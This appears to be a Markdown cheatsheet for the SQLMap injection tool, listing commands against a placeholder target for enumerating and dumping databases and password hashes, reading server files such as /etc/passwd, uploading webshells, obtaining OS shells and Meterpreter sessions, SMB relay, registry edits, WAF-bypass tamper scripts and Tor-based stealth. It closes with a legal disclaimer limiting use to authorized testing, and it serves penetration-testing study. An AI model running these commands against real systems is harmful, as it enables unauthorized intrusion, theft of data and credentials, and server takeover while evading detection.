# 💉 SQLMap - Complete Cheatsheet

```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    Automatic SQL Injection Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="SQL Injection">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Penetration Testing">
</p>

<p align="center">
  <b>🔥 The most powerful SQL injection automation tool</b>
</p>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Installation](#-installation)
- [Basic Syntax](#-basic-syntax)
- [Target Options](#-target-options)
- [Request Options](#-request-options)
- [Detection Options](#-detection-options)
- [Enumeration](#-enumeration)
- [Data Extraction](#-data-extraction)
- [File Operations](#-file-operations)
- [OS Access](#-os-access)
- [Bypass Techniques](#-bypass-techniques)
- [Tamper Scripts](#-tamper-scripts)
- [Real-World Examples](#-real-world-examples)
- [Quick Reference](#-quick-reference)
- [Tips & Best Practices](#-tips--best-practices)
- [Resources](#-resources)

---

## 🎯 Introduction

**SQLMap** is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities.

### Key Features

| Feature | Description |
|---------|-------------|
| **Auto Detection** | Automatically detects SQL injection vulnerabilities |
| **Database Support** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite, and more |
| **Full Takeover** | Database fingerprinting, data extraction, OS access |
| **Bypass Techniques** | WAF/IPS bypass with tamper scripts |
| **Multiple Injection Types** | Boolean, Error, Union, Stacked, Time-based |

### Supported Databases

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

### SQL Injection Types

| Type | Code | Description |
|------|------|-------------|
| Boolean-based blind | `B` | True/False responses |
| Error-based | `E` | Database errors in response |
| Union query-based | `U` | UNION SELECT injection |
| Stacked queries | `S` | Multiple queries (;) |
| Time-based blind | `T` | Response time delays |
| Inline queries | `Q` | Inline (nested) queries |

---

## 📥 Installation

### Kali Linux (Pre-installed)
```bash
# Update SQLMap
sudo apt update && sudo apt install sqlmap
```

### From GitHub (Latest Version)
```bash
# Clone repository
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Run SQLMap
cd sqlmap-dev
python sqlmap.py --version
```

### Using pip
```bash
pip install sqlmap
```

### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

### Verify Installation
```bash
sqlmap --version
sqlmap -h          # Basic help
sqlmap -hh         # Advanced help
```

---

## ⌨️ Basic Syntax

### General Syntax
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

### Quick Start Examples
```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# Scan with cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Scan POST request
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Scan from file
sqlmap -r request.txt

# Full auto mode
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

## 🎯 Target Options

### URL Target (-u)
```bash
# Basic URL
sqlmap -u "http://target.com/page.php?id=1"

# Multiple parameters
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# Specify parameter to test
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# Test all parameters
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

### Request File (-r)
```bash
# Save request from Burp Suite to file
# Then scan:
sqlmap -r request.txt

# Request file example:
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

### Google Dork (-g)
```bash
# Search and test Google results
sqlmap -g "inurl:page.php?id="

# With specific pages
sqlmap -g "inurl:product.php?id= site:target.com"
```

### Direct Database Connection (-d)
```bash
# Connect directly to database
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

### Bulk Targets (-m)
```bash
# File with multiple URLs
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

### Configuration File (-c)
```bash
# Use config file
sqlmap -c sqlmap.conf
```

---

## 📡 Request Options

### HTTP Method & Data
```bash
# POST data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Specify method
sqlmap -u "http://target.com/api/user/1" --method=PUT

# JSON data
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Cookies
```bash
# Single cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Multiple cookies
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# Load cookies from file
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# Test cookie parameter
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

### Headers
```bash
# Custom header
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# Multiple headers
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Random User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

### Authentication
```bash
# Basic auth
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Digest auth
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# NTLM auth
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

### Proxy
```bash
# HTTP proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# SOCKS proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# Check Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

## 🔍 Detection Options

### Level & Risk
```bash
# Level (1-5) - Number of tests
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Risk (1-3) - Danger of tests
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# Recommended for thorough testing
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| Level | Tests |
|-------|-------|
| 1 | Default - Basic tests |
| 2 | + Cookie testing |
| 3 | + User-Agent, Referer testing |
| 4 | + More payloads |
| 5 | + All payloads |

| Risk | Description |
|------|-------------|
| 1 | Default - Safe tests |
| 2 | + Heavy time-based tests |
| 3 | + OR-based tests (may modify data!) |

### Technique Selection
```bash
# Specific technique
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # Union only
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # Boolean only
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # Error only
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # Time-based only
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # Stacked only

# Multiple techniques
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# All techniques (default)
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

### Time Delays
```bash
# Time for time-based injection (default: 5)
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# Delay between requests
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

### Threads
```bash
# Concurrent connections (default: 1)
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

## 📊 Enumeration

### Database Enumeration
```bash
# Get current database
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Get current user
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Check if user is DBA
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# List all databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# List all users
sqlmap -u "http://target.com/page.php?id=1" --users

# List user passwords
sqlmap -u "http://target.com/page.php?id=1" --passwords

# List privileges
sqlmap -u "http://target.com/page.php?id=1" --privileges

# List roles
sqlmap -u "http://target.com/page.php?id=1" --roles
```

### Table Enumeration
```bash
# List tables in database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# List all tables
sqlmap -u "http://target.com/page.php?id=1" --tables

# Count table entries
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

### Column Enumeration
```bash
# List columns in table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Search for column names
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

### Schema Dump
```bash
# Dump database schema
sqlmap -u "http://target.com/page.php?id=1" --schema

# Exclude system databases
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

## 📤 Data Extraction

### Dump Data
```bash
# Dump specific table
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# Dump all tables in database
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# Dump everything
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Exclude system databases
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### Limit Results
```bash
# First 10 rows
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# Rows 5-15
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# WHERE clause
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

### Custom SQL Queries
```bash
# Execute SQL query
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# Interactive SQL shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

### Output Formats
```bash
# Save to CSV
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# Save to HTML
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

## 📁 File Operations

### Read Files
```bash
# Read file from server
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Read Windows files
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Read web config
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

### Write Files
```bash
# Write file to server
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# Upload webshell
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

## 💻 OS Access

### Command Execution
```bash
# Execute OS command
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Interactive shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# PowerShell on Windows
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

### Meterpreter Session
```bash
# Get Meterpreter session
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# With specific options
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

### SMB Relay
```bash
# SMB relay attack
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

### Registry Access (Windows)
```bash
# Read registry
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# Add registry key
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# Delete registry key
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

## 🛡️ Bypass Techniques

### WAF/IPS Bypass
```bash
# Identify WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Skip WAF detection
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# Random case
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# Multiple tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

### Common Tamper Scripts
```bash
# URL encoding
--tamper=charencode

# Double URL encoding
--tamper=chardoubleencode

# Unicode encoding
--tamper=charunicodeencode

# Replace spaces with comments
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# Case manipulation
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# Replace keywords
--tamper=between
--tamper=equaltolike
```

### Tamper Scripts Reference

| Script | Description |
|--------|-------------|
| `apostrophemask` | Replace apostrophe with UTF-8 |
| `apostrophenullencode` | Replace apostrophe with double unicode |
| `base64encode` | Base64 encode payload |
| `between` | Replace `>` with `NOT BETWEEN 0 AND #` |
| `charencode` | URL encode all characters |
| `charunicodeencode` | Unicode-URL encode |
| `concat2concatws` | Replace `CONCAT` with `CONCAT_WS` |
| `equaltolike` | Replace `=` with `LIKE` |
| `greatest` | Replace `>` with `GREATEST` |
| `halfversionedmorekeywords` | Add versioned MySQL comment |
| `ifnull2ifisnull` | Replace `IFNULL` with `IF(ISNULL())` |
| `lowercase` | Replace keywords with lowercase |
| `modsecurityversioned` | Bypass ModSecurity with versioned comment |
| `modsecurityzeroversioned` | Bypass ModSecurity with zero-versioned comment |
| `percentage` | Add percentage sign in front of characters |
| `randomcase` | Random keyword case |
| `randomcomments` | Add random comments to SQL keywords |
| `securesphere` | Append special string to bypass SecureSphere |
| `space2comment` | Replace space with `/**/` |
| `space2dash` | Replace space with dash comment `--` |
| `space2hash` | Replace space with `#` comment |
| `space2morehash` | Replace space with `#` and newline |
| `space2mssqlblank` | Replace space with MSSQL blank characters |
| `space2mssqlhash` | Replace space with `#` and newline (MSSQL) |
| `space2plus` | Replace space with `+` |
| `space2randomblank` | Replace space with random blank character |
| `symboliclogical` | Replace `AND`/`OR` with `&&`/`||` |
| `unionalltounion` | Replace `UNION ALL` with `UNION` |
| `unmagicquotes` | Replace quote with multibyte `%bf%27` |
| `uppercase` | Replace keywords with uppercase |
| `versionedkeywords` | Enclose keywords with versioned comment |
| `versionedmorekeywords` | Enclose more keywords with versioned comment |
| `xforwardedfor` | Add fake `X-Forwarded-For` header |

---

## 🎬 Real-World Examples

### Example 1: Basic Scan
```bash
# Scan with auto mode
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

### Example 2: Full Database Dump
```bash
# Enumerate and dump
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# After finding database
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# Dump users table
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

### Example 3: POST Request with Cookie
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

### Example 4: Through Burp Proxy
```bash
# Save request from Burp to file, then:
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

### Example 5: WAF Bypass
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

### Example 6: Get OS Shell
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

### Example 7: Read Sensitive Files
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

## 📊 Quick Reference

### Essential Commands

| Command | Description |
|---------|-------------|
| `-u URL` | Target URL with parameter |
| `-r FILE` | Load request from file |
| `--data=DATA` | POST data |
| `--cookie=COOKIE` | HTTP Cookie |
| `--dbs` | List databases |
| `--tables` | List tables |
| `--columns` | List columns |
| `--dump` | Dump data |
| `-D DB` | Specify database |
| `-T TABLE` | Specify table |
| `-C COLS` | Specify columns |
| `--batch` | Non-interactive mode |

### Detection Options

| Option | Description |
|--------|-------------|
| `--level=LEVEL` | Test level (1-5) |
| `--risk=RISK` | Risk level (1-3) |
| `-p PARAM` | Testable parameter |
| `--technique=TECH` | Injection technique |
| `--threads=N` | Concurrent threads |

### Output Options

| Option | Description |
|--------|-------------|
| `-v LEVEL` | Verbosity (0-6) |
| `--batch` | Never ask for input |
| `--flush-session` | Clear session cache |
| `--output-dir=DIR` | Custom output directory |

---

## 💡 Tips & Best Practices

### Performance Tips

1. **Start Simple**
   ```bash
   # Start with low level
   sqlmap -u "URL" --level=1 --batch
   # Increase if needed
   ```

2. **Use --batch for Automation**
   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **Save Time with Specific Tests**
   ```bash
   # Test only Union-based
   sqlmap -u "URL" --technique=U
   ```

### Stealth Tips

1. **Random User-Agent**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **Add Delay**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **Use Tor**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

### Troubleshooting

| Issue | Solution |
|-------|----------|
| No injection found | Increase `--level` and `--risk` |
| WAF blocking | Use `--tamper` scripts |
| Slow scan | Reduce `--level`, use specific `--technique` |
| Connection issues | Check `--timeout`, `--retries` |

---

## ⚠️ Legal Disclaimer

> **WARNING:** SQLMap is a powerful tool that should only be used for **authorized testing**.
> 
> - ✅ Test on systems you own
> - ✅ Test with explicit written permission
> - ✅ Use in legal penetration testing engagements
> - ❌ Never use on systems without authorization
> - ❌ Never use for malicious purposes
> 
> **Unauthorized access to computer systems is illegal and punishable by law.**

---

## 📚 Resources

### Official Resources
- [SQLMap Official Website](https://sqlmap.org/)
- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)

### Learning Resources
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

### Related Cheatsheets
- [Metasploit Framework](../Metasploit/README.md)
- [Meterpreter](../Metasploit/Meterpreter.md)

---

<p align="center">
  <b>💉 Master SQL Injection Testing!</b><br>
  <i>With great power comes great responsibility</i>
</p>
